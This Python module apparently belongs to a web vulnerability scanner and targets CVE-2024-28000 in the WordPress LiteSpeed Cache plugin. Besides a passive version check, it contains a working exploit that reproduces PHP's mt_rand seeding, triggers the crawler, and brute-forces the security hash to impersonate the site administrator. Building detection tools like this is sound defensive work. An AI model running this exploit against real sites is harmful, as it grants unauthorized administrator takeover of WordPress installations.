from __future__ import annotations

import json
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any

from ...core.http import is_transport_error, normalize_url, request, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_required, parse_version_safe
from .plugin_advisory import passive_plugin_finding

CVE_ID = "CVE-2024-28000"
NAME = "LiteSpeed Cache unauthenticated privilege escalation"
COMPONENT = "WordPress plugin LiteSpeed Cache"
AFFECTED_RULE = "LiteSpeed Cache 1.9 through 6.3.0.1"
PLUGIN_SLUG = "litespeed-cache"
PATCHED_VERSION = "6.4"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
HASH_CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
SEED_SPACE = 1_000_000
TRIGGER_URL = "/wp-admin/admin-ajax.php"
VERIFY_PATHS = (
    "/?rest_route=/wp/v2/users/me&context=edit",
    "/wp-json/wp/v2/users/me?context=edit",
)


class _PHPMT:
    """PHP 8 mt_rand(0, 61) compatible generator used by Str::rrand(6)."""

    def __init__(self, seed: int):
        self.mt = [0] * 624
        self.index = 624
        self.mt[0] = seed & 0xFFFFFFFF
        for i in range(1, 624):
            prev = self.mt[i - 1]
            self.mt[i] = (1812433253 * (prev ^ (prev >> 30)) + i) & 0xFFFFFFFF

    def _twist(self) -> None:
        for i in range(624):
            y = (self.mt[i] & 0x80000000) + (self.mt[(i + 1) % 624] & 0x7FFFFFFF)
            self.mt[i] = self.mt[(i + 397) % 624] ^ (y >> 1)
            if y & 1:
                self.mt[i] ^= 0x9908B0DF
        self.index = 0

    def _rand32(self) -> int:
        if self.index >= 624:
            self._twist()
        y = self.mt[self.index]
        self.index += 1
        y ^= y >> 11
        y ^= (y << 7) & 0x9D2C5680
        y ^= (y << 15) & 0xEFC60000
        y ^= y >> 18
        return y & 0xFFFFFFFF

    def rrand6(self) -> str:
        return "".join(HASH_CHARSET[self._rand32() % 62] for _ in range(6))


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "DETECTED_VERSION_UNKNOWN"
    if parsed < parse_version_required("1.9"):
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if parsed < parse_version_required(PATCHED_VERSION) else "PATCHED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    return passive_plugin_finding(
        cve=CVE_ID,
        name=NAME,
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        plugin_slug=PLUGIN_SLUG,
        plugins=plugins,
        classify=classify_version,
        remediation="Upgrade LiteSpeed Cache to 6.4 or newer, rotate security hashes, and audit administrator accounts.",
        exploit_available=HAS_EXPLOIT,
    )


def _verify_hash(base: str, candidate: str, timeout: int, proxy: str | None) -> tuple[bool, str | None]:
    cookie = f"litespeed_role=1; litespeed_hash={candidate}"
    for path in VERIFY_PATHS:
        response = request(
            f"{base}{path}",
            headers={"Cookie": cookie, "Accept": "application/json"},
            timeout=timeout,
            proxy=proxy,
        )
        if response.get("status") != 200:
            continue
        try:
            data = json.loads(response.get("body", ""))
        except (json.JSONDecodeError, TypeError):
            continue
        if (
            isinstance(data, dict)
            and data.get("id") == 1
            and isinstance(data.get("capabilities"), dict)
            and data["capabilities"].get("administrator")
        ):
            return True, f"{base}{path}"
    return False, None


def _seed_candidates(center: int, window: int) -> list[int]:
    seeds = [center % SEED_SPACE]
    for delta in range(1, window + 1):
        seeds.append((center + delta) % SEED_SPACE)
        seeds.append((center - delta) % SEED_SPACE)
    return seeds


def _try_seeds(
    base: str,
    seeds: list[int],
    timeout: int,
    proxy: str | None,
    max_workers: int,
    deadline: float,
) -> tuple[int, str, str] | None:
    started = time.monotonic()
    pool = ThreadPoolExecutor(max_workers=max_workers)
    try:
        for offset in range(0, len(seeds), 4096):
            chunk = seeds[offset : offset + 4096]
            futures = {
                pool.submit(_verify_hash, base, _PHPMT(seed).rrand6(), timeout, proxy): seed
                for seed in chunk
            }
            for future in as_completed(futures):
                seed = futures[future]
                matched, proof_url = future.result()
                if matched:
                    pool.shutdown(wait=False, cancel_futures=True)
                    return seed, _PHPMT(seed).rrand6(), proof_url or f"{base}{VERIFY_PATHS[0]}"
            if time.monotonic() - started >= deadline:
                return None
    finally:
        pool.shutdown(wait=False, cancel_futures=True)
    return None


def _trigger_crawler(base: str, timeout: int, proxy: str | None) -> dict[str, Any]:
    return request(
        f"{base}{TRIGGER_URL}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data="action=async_litespeed&litespeed_type=crawler_force",
        timeout=timeout,
        proxy=proxy,
    )


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    known_hash: str | None = None,
    seed_window_ms: int = 100,
    full_seed_space: bool = False,
    max_workers: int = 32,
    deadline: float = 180.0,
) -> Finding:
    base = normalize_url(target_url)

    if known_hash:
        matched, proof_url = _verify_hash(base, known_hash, timeout, proxy)
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE" if matched else "NOT_CONFIRMED",
            confidence="CONFIRMED" if matched else "MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=proof_url,
            detail=(
                "The supplied LiteSpeed hash impersonated administrator user ID 1."
                if matched
                else "The supplied LiteSpeed hash did not authenticate as administrator user ID 1."
            ),
            action=(
                "Rotate the LiteSpeed security hash, audit administrator sessions, and upgrade to 6.4 or newer."
                if matched
                else "Verify the hash value and upgrade LiteSpeed Cache to 6.4 or newer."
            ),
            evidence={"known_hash": known_hash, "matched": matched},
        )

    start_wall = time.time()
    trigger = _trigger_crawler(base, timeout, proxy)
    end_wall = time.time()
    if is_transport_error(trigger):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=f"The crawler trigger could not obtain an HTTP response ({transport_error_detail(trigger)}).",
            action="Retry when the target is reachable; do not interpret transport failure as patch status.",
        )
    if trigger.get("status") != 200:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="BLOCKED_EXTERNAL",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=f"The crawler trigger returned HTTP {trigger.get('status')}; hash generation could not be requested.",
            action="Verify the crawler endpoint and upgrade LiteSpeed Cache to 6.4 or newer.",
        )

    duration = max(0.0, end_wall - start_wall)
    # The hash is generated shortly before the crawler response completes.
    estimated = start_wall + max(0.0, duration - 0.12)
    center = int((estimated % 1.0) * SEED_SPACE)
    window = SEED_SPACE // 2 if full_seed_space else max(1, seed_window_ms * 1000)
    candidates = _seed_candidates(center, window)
    found = _try_seeds(base, candidates, timeout, proxy, max_workers, deadline)
    if found:
        seed, candidate_hash, proof_url = found
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=proof_url,
            detail=(
                "Recovered the LiteSpeed crawler hash from its microtime-seeded PRNG and used it with "
                "litespeed_role=1 to impersonate administrator user ID 1."
            ),
            action="Rotate the LiteSpeed security hash, audit administrator sessions, and upgrade to 6.4 or newer.",
            evidence={
                "trigger_status": trigger.get("status", 0),
                "trigger_duration": round(duration, 3),
                "seed": seed,
                "hash": candidate_hash,
                "seed_window": window,
                "attempts": len(candidates),
            },
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        detail=(
            "The crawler trigger completed, but no hash in the searched seed window impersonated "
            "administrator user ID 1. The site may already hold an older hash or its clock may be skewed."
        ),
        action="Retry with a wider seed window or the full seed space, and upgrade LiteSpeed Cache to 6.4 or newer.",
        evidence={
            "trigger_status": trigger.get("status", 0),
            "trigger_duration": round(duration, 3),
            "seed_center": center,
            "seed_window": window,
            "attempts": len(candidates),
        },
    )


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
):
    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode != "aggressive":
        passive.detail += " This CVE requires aggressive lab-only hash recovery."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        passive.detail += " Aggressive proof skipped because LiteSpeed Cache was not detected as potentially affected."
        return passive

    known_hash = None
    full_seed_space = False
    if aggressive_command:
        value = aggressive_command.strip()
        if re.fullmatch(r"[0-9A-Za-z]{6}", value):
            known_hash = value
        elif value.lower() == "full":
            full_seed_space = True
    result = run_aggressive_probe(
        target_url,
        timeout=timeout,
        proxy=proxy,
        known_hash=known_hash,
        full_seed_space=full_seed_space,
    )
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_versions": [">=1.9,<6.4"],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.1.0",
        "last_reviewed": "2026-11-08",
        "updated": "2026-11-08",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2024-28000",
            "https://www.wordfence.com/blog/2024/08/over-5000000-site-owners-affected-by-critical-privilege-escalation-vulnerability-patched-in-litespeed-cache-plugin/",
            "https://www.exploit-db.com/exploits/52328",
        ],
    }
